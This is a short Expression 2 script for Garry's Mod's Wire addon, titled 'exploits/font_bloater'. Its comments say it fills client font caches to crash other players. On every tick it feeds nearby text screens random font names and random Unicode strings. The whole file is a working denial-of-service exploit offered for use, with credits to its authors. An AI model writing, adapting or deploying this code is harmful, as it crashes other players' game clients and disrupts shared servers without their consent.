@name exploits/font_bloater
@persist Screens:array

# Original concept by Auralius, fixed by Fasteroid
# fills client font caches and can easily crash people
# 64-bit clients are more resilient

# place some text screens near the chip to power up the exploit

if(first()){
    
    runOnTick(1)
    timer("find",250)
    
    holoCreate(1)
    holoParent(1,entity())
    holoModel(1,"hq_icosphere")
    holoScaleUnits(1,vec(-200))
    holoMaterial(1,"lights/white")
    holoAlpha(1,50)
    
}

if(clk("find")){
    findIncludeClass("gmod_wire_textscreen")
    findInSphere(entity():pos(),100)
    TMP = findToArray()
    foreach(N,K:entity = TMP){
        Screens[N,wirelink] = K:wirelink()    
    }
    timer("find",250)
}

foreach(N,K:wirelink = Screens){
    K["Font", string] = random()+""
    K["String", string] = toUnicodeChar( randint(128,255), randint(128,255), randint(128,255), randint(128,255), randint(128,255), randint(128,255), randint(128,255) )
}

holoColor(1,hsv2rgb((curtime()*100)%360,1,1))

